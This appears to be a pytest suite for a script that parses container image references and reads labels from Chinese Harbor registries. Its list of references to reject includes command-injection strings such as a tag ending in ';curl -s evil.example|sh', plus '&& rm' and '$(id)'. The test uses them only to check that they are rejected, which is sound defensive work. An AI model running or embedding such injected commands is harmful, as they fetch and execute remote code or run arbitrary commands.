# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

"""Tests for scripts/registry_labels.py: China NIM distributor images and their labels.

The Harbor answers in tests/fixtures/cnd are real, read anonymously from io.chancloud.com,
resource.turingcm.com and tgcr.turing-agi.com on 2026-11-05 (trimmed to the fields read). A local
HTTP server stands in for the registry (ns_testkit.set_harbor_base); conftest.py points every
other test at a closed port.
"""

from __future__ import annotations

import contextlib
import os
import socket
import threading
import time
from collections.abc import Iterator
from typing import Any

import pytest
import registry_labels as rl
from ns_testkit import fixture_json, run_cli, serve, set_harbor_base, use_built_in_endpoints

QWEN = "io.chancloud.com/cnd/qwen/qwen3.5-35b-a3b:1.0.0"
QWEN_REPO = "/api/v2.0/projects/cnd/repositories/qwen%252Fqwen3.5-35b-a3b/artifacts"
QWEN_PATH = f"{QWEN_REPO}/1.0.0"
INDEX = "resource.turingcm.com/qwen/qwen3.6-27b:1.0"
INDEX_REPO = "/api/v2.0/projects/qwen/repositories/qwen3.6-27b/artifacts"
INDEX_PATH = f"{INDEX_REPO}/1.0"
CHILD = "sha256:efd6e93849fa23ee07f46e79bbb4d55a513d97d3537311b60b310805f97a3986"


def cnd(name: str) -> Any:
    return fixture_json("cnd", name)


def with_labels(labels: dict[str, str], arch: str = "amd64") -> dict[str, Any]:
    return {"extra_attrs": {"architecture": arch, "config": {"Labels": labels}}}


def read(
    monkeypatch: pytest.MonkeyPatch, routes: dict[str, Any], image: str, arch: str | None = None
) -> tuple[rl.Labels, list[str]]:
    ref = rl.parse_image(image)
    assert ref is not None
    with serve(routes) as server:
        set_harbor_base(monkeypatch, server.base.removesuffix("/v2"))
        labels = rl.read_labels(ref, arch)
        return labels, list(server.requests)


def count_open_requests(monkeypatch: pytest.MonkeyPatch) -> list[int]:
    """[requests open now, the most open at once], counted by the client: from ns.open_url until
    its answer is closed, all inside the request's slot. (The fake server counts a request until
    after it sent the answer, when the client may already have given its slot to the next one.)"""
    real, lock, count = rl.ns.open_url, threading.Lock(), [0, 0]

    @contextlib.contextmanager
    def counted(request: Any, timeout: float) -> Iterator[Any]:
        with lock:
            count[0] += 1
            count[1] = max(count[1], count[0])
        try:
            with real(request, timeout) as response:
                yield response
        finally:
            with lock:
                count[0] -= 1

    monkeypatch.setattr(rl.ns, "open_url", counted)
    return count


# --- references -------------------------------------------------------------------------------


def test_parse_image_splits_host_project_repo_and_tag() -> None:
    ref = rl.parse_image(QWEN)
    assert ref == rl.ImageRef(
        "io.chancloud.com", "lichan", "io.chancloud.com", "cnd", "qwen/qwen3.5-35b-a3b", "1.0.0"
    )
    assert ref.image == QWEN
    assert ref.repository_ref == QWEN.rsplit(":", 1)[0]
    assert ref.with_tag("latest").image == QWEN.replace("1.0.0", "latest")


def test_parse_image_reads_the_tgcr_mirror_through_the_primary_api() -> None:
    ref = rl.parse_image("tgcr-gz.turing-agi.com/public/qwen/qwen3.6-27b:latest")
    assert ref is not None
    assert (ref.source, ref.api_host, ref.project) == ("tgcr", "tgcr.turing-agi.com", "public")


def test_parse_image_takes_the_tag_flag_and_drops_a_digest() -> None:
    ref = rl.parse_image("resource.turingcm.com/qwen/qwen3.6-27b", "1.0")
    assert ref is not None and ref.tag == "1.0"
    digest = "sha256:" + "a" * 64
    ref = rl.parse_image(f"resource.turingcm.com/qwen/qwen3.6-27b:1.0@{digest}")
    assert ref is not None and (ref.tag, ref.image) == ("1.0", INDEX)
    ref = rl.parse_image("resource.turingcm.com/qwen/qwen3.6-27b")
    assert ref is not None and (ref.tag, ref.image) == (
        None,
        "resource.turingcm.com/qwen/qwen3.6-27b",
    )


@pytest.mark.parametrize(
    "image",
    [
        "nvcr.io/nim/meta/llama-3.1-8b-instruct:2.1.4",
        "registry.example.com:5000/cnd/meta/llama:1.0",
        "meta/llama-3.1-8b-instruct",
        "io.chancloud.com/qwen3.5:1.0.0",
        "",
        # what a catalog may hold that is no image reference (the Docker grammar)
        "tgcr-gz.turing-agi.com/public/qwen/qwen3.6-27b:1.0;curl -s evil.example|sh",
        "tgcr-gz.turing-agi.com/public/qwen/qwen3.6-27b:1.0 && rm",
        "io.chancloud.com/cnd/qwen/$(id):1.0",
        "io.chancloud.com/cnd/qwen//qwen3.5:1.0",
        "io.chancloud.com/cnd/qwen/-qwen3.5:1.0",
        "io.chancloud.com/cnd/qwen/qwen3.5:" + "1" * 129,
        "io.chancloud.com/cnd/qwen/qwen3.5:.1",
    ],
)
def test_parse_image_is_none_for_other_references(image: str) -> None:
    assert rl.parse_image(image) is None


def test_parse_image_reads_the_docker_reference_grammar() -> None:
    ref = rl.parse_image("IO.ChanCloud.com/CND/Qwen/Qwen3.5-35B-A3B:1.0.0-RC_1")
    assert ref is not None and ref.image == "io.chancloud.com/cnd/qwen/qwen3.5-35b-a3b:1.0.0-RC_1"
    ref = rl.parse_image("io.chancloud.com/cnd/nim/a__b/c.d-e:latest")
    assert ref is not None and ref.repository == "nim/a__b/c.d-e"
    assert rl.parse_image("io.chancloud.com/cnd/qwen/qwen3.5", "1.0;x") is None  # --tag too


def test_artifact_and_list_urls_double_encode_the_repository(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    use_built_in_endpoints(monkeypatch)
    ref = rl.parse_image(QWEN)
    assert ref is not None
    assert rl.artifact_url(ref, "1.0.0") == f"https://io.chancloud.com{QWEN_PATH}?with_label=true"
    assert rl.list_url(ref) == (
        f"https://io.chancloud.com{QWEN_REPO}?with_tag=true&with_label=true&q=tags%3D*"
        f"&sort=-push_time&page_size={rl.LIST_SIZE}"
    )


@pytest.mark.parametrize(
    ("ngc_url", "expected"),
    [
        (
            "nvcr.io/nim/qwen/qwen3.5-35b-a3b:1.7.0-variant",
            ("nim/qwen/qwen3.5-35b-a3b", "1.7.0-variant"),
        ),
        (
            "NVCR.IO/nim/Meta/Llama-3.1-8B-Instruct:1.8.0-RTX",
            ("nim/meta/llama-3.1-8b-instruct", "1.8.0-RTX"),
        ),
        ("nvcr.io/nim/zai-org/glm-5:1.7-variant", ("nim/zai-org/glm-5", "1.7-variant")),
        # the real lichan label: a staging image, never public
        ("nvcr.io/example-org/nim/qwen3.5-35b-a3b:modelscope_2", None),
        ("nvcr.io/0123456789/qwen/qwen3.5-35b-a3b:build_2", None),
        # a version tag does not make a staging or private-org path public
        ("nvcr.io/example-org/nim/qwen3.5-35b-a3b:1.7.0-variant", None),
        ("nvcr.io/0123456789/qwen/qwen3.5-35b-a3b:1.7.0", None),
        ("nvcr.io/nim/qwen/qwen3.5-35b-a3b:latest", None),
        ("nvcr.io/nim/qwen/qwen3.5-35b-a3b", None),
        ("nvcr.io/nim/openfold3:1.2.0", None),
        (None, None),
    ],
)
def test_public_ngc_image(ngc_url: str | None, expected: tuple[str, str] | None) -> None:
    assert rl.public_ngc_image(ngc_url) == expected


# --- reading the labels -------------------------------------------------------------------------


def test_read_labels_of_the_real_lichan_image(monkeypatch: pytest.MonkeyPatch) -> None:
    routes = {QWEN_PATH: (200, cnd("lichan-artifact-qwen3.5-35b-a3b-1.0.0.json"))}
    labels, requests = read(monkeypatch, routes, QWEN)
    assert requests == [QWEN_PATH + "?with_label=true"]
    assert (labels.status, labels.version, labels.ngc_url) == (
        "read",
        "1.7.0-variant",
        "nvcr.io/example-org/nim/qwen3.5-35b-a3b:modelscope_2",
    )
    assert labels.architectures == ("amd64",)
    assert labels.tags == ("1.0.0", "1.0", "1", "latest")
    assert labels.size == 8482695050 and labels.digest and labels.digest.startswith("sha256:")
    assert labels.as_facts()["version"] == "1.7.0-variant"


def test_read_labels_follows_a_multi_arch_index(monkeypatch: pytest.MonkeyPatch) -> None:
    index = cnd("turingcm-artifacts-qwen3.6-27b.json")[0]
    routes = {
        INDEX_PATH: (200, index),
        f"{INDEX_REPO}/{CHILD}": (200, with_labels({rl.VERSION_LABEL: "1.2.0"})),
    }
    labels, requests = read(monkeypatch, routes, INDEX, "x86_64")
    assert (labels.status, labels.version) == ("read", "1.2.0")
    assert len(requests) == 2 and CHILD in requests[1]
    # the index's own tags and real platforms; the attestation entry is no architecture
    assert labels.tags == ("1.0", "1", "latest") and labels.architectures == ("amd64",)


def test_the_real_turingcm_image_has_no_nim_labels(monkeypatch: pytest.MonkeyPatch) -> None:
    routes = {
        INDEX_PATH: (200, cnd("turingcm-artifacts-qwen3.6-27b.json")[0]),
        f"{INDEX_REPO}/{CHILD}": (200, cnd("turingcm-child-qwen3.6-27b.json")),
    }
    labels, _ = read(monkeypatch, routes, INDEX, "amd64")
    assert (labels.status, labels.version, labels.ngc_url) == ("read", None, None)
    assert labels.problem and rl.VERSION_LABEL in labels.problem


def test_read_labels_of_a_missing_child_image(monkeypatch: pytest.MonkeyPatch) -> None:
    # the tag is there, only its image's labels are not: never not_found (tag_not_found)
    routes = {INDEX_PATH: (200, cnd("turingcm-artifacts-qwen3.6-27b.json")[0])}
    labels, _ = read(monkeypatch, routes, INDEX)
    assert (labels.status, labels.version, labels.ngc_url) == ("read", None, None)
    assert labels.problem and "could not be read" in labels.problem
    assert "multi-arch index" in labels.problem and "HTTP 404" in labels.problem
    assert labels.tags == ("1.0", "1", "latest") and labels.architectures == ("amd64",)
    # another failure of the child image is still that failure
    routes[f"{INDEX_REPO}/{CHILD}"] = (500, {})
    labels, _ = read(monkeypatch, routes, INDEX)
    assert labels.status == "unreachable" and labels.problem and "HTTP 500" in labels.problem


@pytest.mark.parametrize(
    ("answer", "status", "words"),
    [
        ((401, cnd("tgcr-401.json")), "unauthorized", "needs a login"),
        ((403, {}), "unauthorized", "needs a login"),
        ((404, cnd("lichan-404.json")), "not_found", "has no image"),
        ((500, {}), "unreachable", "HTTP 500"),
        ((200, "not json"), "unreachable", "not JSON"),
        ((200, [1, 2]), "unreachable", "not a Harbor artifact"),
    ],
)
def test_read_labels_reports_what_went_wrong(
    monkeypatch: pytest.MonkeyPatch, answer: tuple[int, Any], status: str, words: str
) -> None:
    labels, _ = read(monkeypatch, {QWEN_PATH: answer}, QWEN)
    assert (labels.status, labels.version, labels.ngc_url) == (status, None, None)
    assert labels.problem and words in labels.problem


def test_read_labels_of_a_missing_repository(monkeypatch: pytest.MonkeyPatch) -> None:
    image = "io.chancloud.com/cnd/qwen/qwen3.6-27b:1.0"
    path = "/api/v2.0/projects/cnd/repositories/qwen%252Fqwen3.6-27b/artifacts/1.0"
    labels, _ = read(monkeypatch, {path: (404, cnd("lichan-404-repository.json"))}, image)
    assert (labels.status, labels.version) == ("no_repository", None)
    assert (
        labels.problem == "io.chancloud.com has no repository io.chancloud.com/cnd/qwen/qwen3.6-27b"
    )


def test_an_empty_tag_list_is_checked_against_the_repository_list(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # Harbor lists no tags (200 []) for a repository it does not have
    repos = "/api/v2.0/projects/cnd/repositories"
    missing = rl.parse_image("io.chancloud.com/cnd/qwen/qwen3.6-27b")
    present = rl.parse_image(QWEN)
    assert missing is not None and present is not None
    routes = {
        f"{repos}/qwen%252Fqwen3.6-27b/artifacts": (200, []),
        QWEN_REPO: (200, []),
        repos: (200, cnd("lichan-repositories.json")),  # has qwen3.5-35b-a3b, not qwen3.6-27b
    }
    with serve(routes) as server:
        set_harbor_base(monkeypatch, server.base.removesuffix("/v2"))
        status, images, problem = rl.read_repository(missing)
        assert (status, images) == ("no_repository", [])
        assert problem == "io.chancloud.com has no repository io.chancloud.com/cnd/qwen/qwen3.6-27b"
        assert rl.read_repository(present) == ("read", [], None)
        asked = [path for path in server.requests if path.startswith(repos + "?")]
    assert asked[0] == f"{repos}?q=name%3Dcnd%2Fqwen%2Fqwen3.6-27b&page_size=10"


@pytest.mark.parametrize("answer", [(503, {}), (200, {"a": 1})])
def test_an_empty_tag_list_is_unreachable_when_the_repository_list_cannot_be_read(
    monkeypatch: pytest.MonkeyPatch, answer: tuple[int, Any]
) -> None:
    # whether the repository exists is not known: never an empty listing (cnd.py reads it again)
    ref = rl.parse_image(QWEN)
    assert ref is not None
    with serve({QWEN_REPO: (200, []), "/api/v2.0/projects/cnd/repositories": answer}) as server:
        set_harbor_base(monkeypatch, server.base.removesuffix("/v2"))
        status, images, problem = rl.read_repository(ref)
    assert (status, images) == ("unreachable", [])
    assert problem and "whether it has that repository could not be read" in problem


def test_read_labels_of_an_unreachable_registry() -> None:
    ref = rl.parse_image(QWEN)
    assert ref is not None
    labels = rl.read_labels(ref)
    assert labels.status == "unreachable"
    assert labels.problem and "could not be read" in labels.problem


def test_read_labels_without_nim_labels_or_tag(monkeypatch: pytest.MonkeyPatch) -> None:
    routes = {QWEN_PATH: (200, with_labels({"org.opencontainers.image.title": "qwen"}))}
    labels, _ = read(monkeypatch, routes, QWEN)
    assert (labels.status, labels.version) == ("read", None)
    assert labels.problem and rl.VERSION_LABEL in labels.problem
    ref = rl.parse_image("io.chancloud.com/cnd/qwen/qwen3.5-35b-a3b")
    assert ref is not None
    assert rl.read_labels(ref).status == "no_tag"


def test_child_digest_is_none_for_a_plain_image() -> None:
    plain = cnd("lichan-artifact-qwen3.5-35b-a3b-1.0.0.json")
    assert rl.child_digest(plain, "amd64") is None


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("1.7.0-variant", ("1.7.0-variant", False)),
        ("1.7.1.rc3", ("1.7.1.rc3", False)),
        ("v2.0", ("v2.0", False)),
        ("1.10.0=variant", ("1.10.0-variant", True)),
        ("latest", (None, False)),
        ("modelscope_2", (None, False)),
        ("", (None, False)),
        (None, (None, False)),
    ],
)
def test_label_version(value: str | None, expected: tuple[str | None, bool]) -> None:
    assert rl.label_version(value) == expected


def test_a_registry_that_never_answers_is_cut_off_by_one_deadline(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # The socket accepts connections (the kernel completes them) but never answers.
    with socket.socket() as silent:
        silent.bind(("127.0.0.1", 0))
        silent.listen(8)
        set_harbor_base(monkeypatch, f"http://127.0.0.1:{silent.getsockname()[1]}")
        monkeypatch.setattr(rl, "BUDGET", 0.5)
        monkeypatch.setattr(rl, "LIST_BUDGET", 0.5)
        ref = rl.parse_image(QWEN)
        assert ref is not None
        start = time.monotonic()
        labels = rl.read_labels(ref)
        status, images, problem = rl.read_repository(ref)
        repos = rl.list_repositories("io.chancloud.com", "cnd", budget=0.5)
        elapsed = time.monotonic() - start
    assert elapsed < 3.5
    assert (labels.status, status, images, repos[0]) == (
        "unreachable",
        "unreachable",
        [],
        "unreachable",
    )
    assert labels.problem and "did not answer within 0.5 s" in labels.problem
    assert problem and "did not answer within 0.5 s" in problem


def test_within_reports_a_failure_at_once() -> None:
    def broken() -> str:
        raise KeyError("odd")

    assert rl.within(5.0, broken, lambda why: why).startswith("failed (KeyError")


def test_read_repository_lists_tagged_images_and_follows_indexes(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    index = cnd("turingcm-artifacts-qwen3.6-27b.json")[0]
    listing = [
        {**index, "tags": [{"name": "1.0"}, {"name": "latest"}]},
        {**with_labels({rl.VERSION_LABEL: "1.7.0-variant"}), "tags": [{"name": "1.0.0"}]},
        {**with_labels({rl.VERSION_LABEL: "0.9"}), "tags": None},
    ]
    routes = {
        QWEN_REPO: (200, listing),
        f"{QWEN_REPO}/{CHILD}": (200, with_labels({rl.NGC_URL_LABEL: "nvcr.io/nim/a/b:1.2"})),
    }
    ref = rl.parse_image(QWEN)
    assert ref is not None
    with serve(routes) as server:
        set_harbor_base(monkeypatch, server.base.removesuffix("/v2"))
        status, images, problem = rl.read_repository(ref, "amd64")
        requests = list(server.requests)
    assert (status, problem) == ("read", None)
    assert images == [
        rl.TaggedImage(("1.0", "latest"), None, "nvcr.io/nim/a/b:1.2", ("amd64",), index["digest"]),
        rl.TaggedImage(("1.0.0",), "1.7.0-variant", None, ("amd64",), None),
    ]
    assert requests[0] == QWEN_REPO + (
        f"?with_tag=true&with_label=true&q=tags%3D*&sort=-push_time&page_size={rl.LIST_SIZE}"
    )
    # past MAX_CHILDREN, indexes are listed without labels
    monkeypatch.setattr(rl, "MAX_CHILDREN", 0)
    with serve(routes) as server:
        set_harbor_base(monkeypatch, server.base.removesuffix("/v2"))
        _, images, _ = rl.read_repository(ref, "amd64")
    assert images[0] == rl.TaggedImage(
        ("1.0", "latest"),
        None,
        None,
        ("amd64",),
        index["digest"],
        labels_read=False,
        unread="index limit",
    )


def test_an_index_whose_child_image_could_not_be_read_is_listed_without_labels(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # a child that answers 503 was not read: never an image without NIM labels, so a search's
    # listing that has it is read again (LichanReader.listing); the reason is not the index limit
    index = cnd("turingcm-artifacts-qwen3.6-27b.json")[0]
    routes = {QWEN_REPO: (200, [index]), f"{QWEN_REPO}/{CHILD}": (503, {})}
    ref = rl.parse_image(QWEN)
    assert ref is not None
    with serve(routes) as server:
        set_harbor_base(monkeypatch, server.base.removesuffix("/v2"))
        status, images, problem = rl.read_repository(ref, "amd64")
    assert (status, problem) == ("read", None)
    assert images == [
        rl.TaggedImage(
            ("1.0", "1", "latest"),
            None,
            None,
            ("amd64",),
            index["digest"],
            labels_read=False,
            unread="its image could not be read",
        )
    ]


@pytest.mark.parametrize(
    ("answer", "status"),
    [((401, {}), "unauthorized"), ((404, {}), "not_found"), ((200, {"a": 1}), "unreachable")],
)
def test_read_repository_reports_what_went_wrong(
    monkeypatch: pytest.MonkeyPatch, answer: tuple[int, Any], status: str
) -> None:
    ref = rl.parse_image(QWEN)
    assert ref is not None
    with serve({QWEN_REPO: answer}) as server:
        set_harbor_base(monkeypatch, server.base.removesuffix("/v2"))
        got, images, problem = rl.read_repository(ref)
    assert (got, images) == (status, [])
    assert problem


def test_list_repositories_reads_every_page(monkeypatch: pytest.MonkeyPatch) -> None:
    names = [{"name": f"cnd/team/repo-{i}"} for i in range(100)]
    path = "/api/v2.0/projects/cnd/repositories"
    routes = {
        f"{path}?page_size=100&page=1": (200, names),
        f"{path}?page_size=100&page=2": (200, cnd("lichan-repositories.json")),
    }
    with serve(routes) as server:
        set_harbor_base(monkeypatch, server.base.removesuffix("/v2"))
        status, found, problem = rl.list_repositories("io.chancloud.com", "cnd")
        requests = list(server.requests)
    assert (status, problem, len(found)) == ("read", None, 149)
    assert "cnd/qwen/qwen3.5-35b-a3b" in found and len(requests) == 2
    with serve({}) as server:
        set_harbor_base(monkeypatch, server.base.removesuffix("/v2"))
        status, found, problem = rl.list_repositories("io.chancloud.com", "cnd")
    assert (status, found) == ("not_found", []) and problem and "no project" in problem


def test_list_repositories_says_when_its_page_cap_may_leave_some_out(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # 5 full pages of 100: the 500 names are kept, but they are not proof of the whole project
    path = "/api/v2.0/projects/cnd/repositories"
    routes = {
        f"{path}?page_size=100&page={page}": (
            200,
            [{"name": f"cnd/team/repo-{page}-{i}"} for i in range(100)],
        )
        for page in range(1, 6)
    }
    with serve(routes) as server:
        set_harbor_base(monkeypatch, server.base.removesuffix("/v2"))
        status, found, problem = rl.list_repositories("io.chancloud.com", "cnd")
        requests = list(server.requests)
    assert (status, len(found), len(requests)) == ("read", 500, 5)
    assert problem == (
        "only the first 500 repositories of project 'cnd' on io.chancloud.com were read: "
        "it may list more"
    )


def test_at_most_four_requests_are_open_even_when_a_deadline_gives_up_on_them(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    count = count_open_requests(monkeypatch)
    # every answer takes 0.4 s; each read is given up after 0.05 s, but its request stays open
    with serve({QWEN_PATH: (200, with_labels({}))}, delay=0.4) as server:
        url = server.base.removesuffix("/v2") + QWEN_PATH
        for _ in range(10):
            assert rl.within(0.05, lambda: rl.http_get_json(url), lambda why: why).startswith(
                "did not answer"
            )
        threads = [threading.Thread(target=rl.http_get_json, args=(url,)) for _ in range(6)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        assert len(server.requests) == 16
    assert count[1] == 4  # four at a time (references/china-distributors.md), never more


def test_a_listing_reads_its_index_images_at_the_same_time(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # 6 multi-arch indexes on a registry that answers each request in 0.3 s: one after the other
    # the 7 reads take 2.1 s, past a 1.6 s budget; at the same time they take 0.9 s
    index = cnd("turingcm-artifacts-qwen3.6-27b.json")[0]
    listing = []
    routes: dict[str, Any] = {}
    for n in range(6):
        child = "sha256:" + f"{n:064x}"
        refs = [{**r, "child_digest": child} for r in index["references"]]
        listing.append({**index, "references": refs, "tags": [{"name": f"1.{n}"}]})
        routes[f"{QWEN_REPO}/{child}"] = (200, with_labels({rl.VERSION_LABEL: f"1.{n}.0"}))
    routes[QWEN_REPO] = (200, listing)
    monkeypatch.setattr(rl, "LIST_BUDGET", 1.6)
    count = count_open_requests(monkeypatch)
    ref = rl.parse_image(QWEN)
    assert ref is not None
    with serve(routes, delay=0.3) as server:
        set_harbor_base(monkeypatch, server.base.removesuffix("/v2"))
        status, images, problem = rl.read_repository(ref, "amd64")
    assert (status, problem) == ("read", None)
    assert [image.version for image in images] == [f"1.{n}.0" for n in range(6)]
    assert count[1] == 4


def test_an_answer_larger_than_the_cap_is_not_read(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(rl, "MAX_ANSWER", 100)
    with serve({"/big": (200, {"items": ["x" * 200]}), "/small": (200, {"a": 1})}) as server:
        root = server.base.removesuffix("/v2")
        code, body, problem = rl.http_get_json(f"{root}/big")
        assert (code, body) == (200, None) and problem and "more than 100 bytes" in problem
        assert rl.http_get_json(f"{root}/small") == (200, {"a": 1}, None)


def test_no_credentials_are_ever_sent(monkeypatch: pytest.MonkeyPatch) -> None:
    for name in ("NGC_API_KEY", "NGC_CLI_API_KEY", "HF_TOKEN", "DOCKER_AUTH_CONFIG"):
        monkeypatch.setenv(name, "secret-value")
    with serve({QWEN_PATH: (200, cnd("lichan-artifact-qwen3.5-35b-a3b-1.0.0.json"))}) as server:
        set_harbor_base(monkeypatch, server.base.removesuffix("/v2"))
        ref = rl.parse_image(QWEN)
        assert ref is not None and rl.read_labels(ref).status == "read"
        sent = [
            {key.lower(): value for key, value in headers.items()} for headers in server.headers
        ]
    assert sent and all(
        "authorization" not in headers and "cookie" not in headers for headers in sent
    )
    assert not any("secret-value" in value for headers in sent for value in headers.values())


def test_run_directly_prints_a_notice() -> None:
    code, payload = run_cli("registry_labels.py")
    assert (code, payload["state"]) == (0, "library")


# --- live (opt-in: NIM_SELECT_LIVE=1 pytest -m network) -----------------------------------------

live = pytest.mark.skipif(
    os.environ.get("NIM_SELECT_LIVE") != "1", reason="live test; set NIM_SELECT_LIVE=1"
)


@pytest.mark.network
@live
def test_live_lichan_label_read(monkeypatch: pytest.MonkeyPatch) -> None:
    """One anonymous label read on Lichan (io.chancloud.com, project cnd)."""
    use_built_in_endpoints(monkeypatch)
    monkeypatch.setattr(rl, "BUDGET", 30.0)
    ref = rl.parse_image(QWEN)
    assert ref is not None
    labels = rl.read_labels(ref, "amd64")
    assert labels.status == "read", labels.problem
    assert labels.version and rl.label_version(labels.version)[0]
    assert "1.0.0" in labels.tags and labels.architectures
